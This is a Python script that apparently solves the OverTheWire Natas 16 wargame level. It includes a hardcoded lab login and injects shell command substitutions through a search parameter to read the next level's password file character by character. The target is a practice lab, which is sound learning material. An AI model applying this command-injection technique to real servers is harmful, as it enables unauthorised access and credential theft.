import requests
import lxml.html
import pdb

url = "http://natas16.natas.labs.overthewire.org/"
session = requests.Session()
session.auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

def results(injection):
    response = session.get(url, params={"needle": injection})
    doc = lxml.html.fromstring(response.content)
    return str(doc.xpath('//pre/text()')[0]).strip().splitlines()


# DOES NOT WORK if letter is an a, or if there are consecutive numbers in
# the passcode
def getLetter(i):
    result = results(f"^$(cut -c {i} /etc/natas_webpass/natas17)")
    periods = '.' * (i - 1)
    
    # Thing is a number
    if len(result) == 0:
        anchor = getLetter(i+1)
        for num in range(10):
            print("--- Hit a number --- ", num)
            result = results(f"^$(grep -oP ^{periods}{num}\\\\K\\({anchor}\\) /etc/natas_webpass/natas17)")
            if result[0][0].lower() == anchor.lower():
                return num

    letter = result[0][0]
    result = results(f"^$(grep -oP ^{periods}\\\\K\\({letter}\\) /etc/natas_webpass/natas17)")

    if result[0][0].lower() == letter.lower():
        return letter
    else:
        return letter.lower() if letter.isupper() else letter.upper()

passkey = ""

for i in range(1, 33):
    passkey += str(getLetter(i))
    print(passkey)
